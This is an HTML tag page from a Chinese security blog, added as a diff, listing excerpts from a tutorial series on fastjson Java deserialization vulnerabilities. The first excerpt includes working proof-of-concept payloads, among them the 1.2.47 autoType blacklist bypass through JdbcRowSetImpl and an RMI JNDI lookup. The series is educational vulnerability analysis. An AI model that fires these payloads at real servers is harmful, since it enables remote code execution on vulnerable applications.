@@ -1,0 +1,143 @@
+<!doctype html><html lang=zh dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>fastjson | 没有理想的人不伤心</title>
+<meta name=keywords content>
+<meta name=description content="Theme PaperMod - https://github.com/adityatelange/hugo-PaperMod">
+<meta name=author content="dushixiang">
+<link rel=canonical href=https://typesafe.cn/tags/fastjson/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.6f60056d44d3f7eb69a4bc6c332b59960f3a995802bded244750232f33713c49.css integrity="sha256-b2AFbUTT9+tppLxsMytZlg86mVgCve0kR1AjLzNxPEk=" rel="preload stylesheet" as=style>
+<link rel=icon href=https://typesafe.cn/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://typesafe.cn/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://typesafe.cn/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://typesafe.cn/apple-touch-icon.png>
+<link rel=mask-icon href=https://typesafe.cn/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.89.0">
+<link rel=alternate type=application/rss+xml href=https://typesafe.cn/tags/fastjson/index.xml>
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript><meta property="og:title" content="fastjson">
+<meta property="og:description" content="Theme PaperMod - https://github.com/adityatelange/hugo-PaperMod">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://typesafe.cn/tags/fastjson/"><meta property="og:image" content="https://typesafe.cn/papermod-cover.png">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://typesafe.cn/papermod-cover.png">
+<meta name=twitter:title content="fastjson">
+<meta name=twitter:description content="Theme PaperMod - https://github.com/adityatelange/hugo-PaperMod">
+</head>
+<body class=list id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://typesafe.cn accesskey=h title="没有理想的人不伤心 (Alt + H)">没有理想的人不伤心</a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://typesafe.cn/archives title=文章>
+<span>文章</span>
+</a>
+</li>
+<li>
+<a href=https://typesafe.cn/categories/ title=分类>
+<span>分类</span>
+</a>
+</li>
+<li>
+<a href=https://typesafe.cn/search/ title=搜索>
+<span>搜索</span>
+</a>
+</li>
+<li>
+<a href=https://typesafe.cn/tags/ title=标签>
+<span>标签</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<header class=page-header><div class=breadcrumbs><a href=https://typesafe.cn>主页</a>&nbsp;»&nbsp;<a href=https://typesafe.cn/tags/>Tags</a></div>
+<h1>fastjson</h1>
+</header>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>Java 反序列化漏洞原理（五）fastjson 1.2.47 绕过原理
+</h2>
+</header>
+<section class=entry-content>
+<p>声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
+Fastjson &lt;= 1.2.47 POC 随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。
+我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。
+import com.alibaba.fastjson.JSON; public class Eval3 { public static void main(String[] args) throws Exception { String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}"; JSON.parse(payload); } } 不出意料的话会出现这样的错误提示信息：
+autoType is not support. com.sun.rowset.JdbcRowSetImpl 这是因为 fastjson 使用了黑名单机制，禁止将 com.sun.rowset.JdbcRowSetImpl 反序列化。
+下面我们使用新的 POC 进行测试，又可以利用成功了。
+import com.alibaba.fastjson.JSON; public class Eval5 { public static void main(String[] args) throws Exception { String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}"; JSON.parse(payload); } } payload 格式化之后如下：...</p>
+</section>
+<footer class=entry-footer><span title="2021-10-31 21:31:00 +0800 +0800">October 31, 2021</span>&nbsp;·&nbsp;3 分钟&nbsp;·&nbsp;dushixiang</footer>
+<a class=entry-link aria-label="post link to Java 反序列化漏洞原理（五）fastjson 1.2.47 绕过原理" href=https://typesafe.cn/posts/java-serialization-vulnerability-5/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>Java 反序列化漏洞原理（四）JNDI + RMI/LDAP 在fastjson中的利用原理
+</h2>
+</header>
+<section class=entry-content>
+<p>声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
+JNDI 是什么 Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。
+JNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。
+轻量级目录访问协议 (LDAP) CORBA 公共对象服务命名（COS naming） Java 远程方法调用 (RMI) 域名服务 (DNS) 这么说起来还是有点抽象，简单理解就是服务提供者提供一个类似Key Value的数据，JNDI可以通过这个 Key 获取到服务提供者上的提供的Value，因此JNDI是无法单独使用的。
+使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。
+// 创建一个上下文对象 InitialContext context = new InitialContext(); // 查找监听在本地 1099 端口上 RMI 服务的 Object 对象 Object obj = context.lookup("rmi://localhost:1099/Object"); RMI 是什么 RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。
+RMI 有三个概念：
+Registry : 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。 Server : 远程方法的提供者。 Client : 远程方法的调用者。 远程方法的定义需要满足两个条件：...</p>
+</section>
+<footer class=entry-footer><span title="2021-10-30 13:43:00 +0800 +0800">October 30, 2021</span>&nbsp;·&nbsp;6 分钟&nbsp;·&nbsp;dushixiang</footer>
+<a class=entry-link aria-label="post link to Java 反序列化漏洞原理（四）JNDI + RMI/LDAP 在fastjson中的利用原理" href=https://typesafe.cn/posts/java-serialization-vulnerability-4/></a>
+</article>
+<article class="post-entry tag-entry">
+<header class=entry-header>
+<h2>Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理
+</h2>
+</header>
+<section class=entry-content>
+<p>声明 本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
+Fastjson 是什么 fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。
+fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。
+以上摘自Fastjson GitHub 介绍。
+但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 NACOS 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 https://github.com/alibaba/nacos/releases/tag/1.3.0) ，可见漏洞危害之大。
+为什么会弃用 Fastjson ？ 想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 CVE-2017-18349 这一条，而 Jackson 竟然有高达 76 条。
+这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。
+那为什么会有公司弃用 Fastjson 呢？
+或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。
+尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。
+Fastjson 漏洞产生原因 Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 https://github....</p>
+</section>
+<footer class=entry-footer><span title="2021-10-21 22:56:00 +0800 +0800">October 21, 2021</span>&nbsp;·&nbsp;5 分钟&nbsp;·&nbsp;dushixiang</footer>
+<a class=entry-link aria-label="post link to Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理" href=https://typesafe.cn/posts/java-serialization-vulnerability-3/></a>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2021 <a href=https://typesafe.cn>没有理想的人不伤心</a></span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+</body>
+</html>
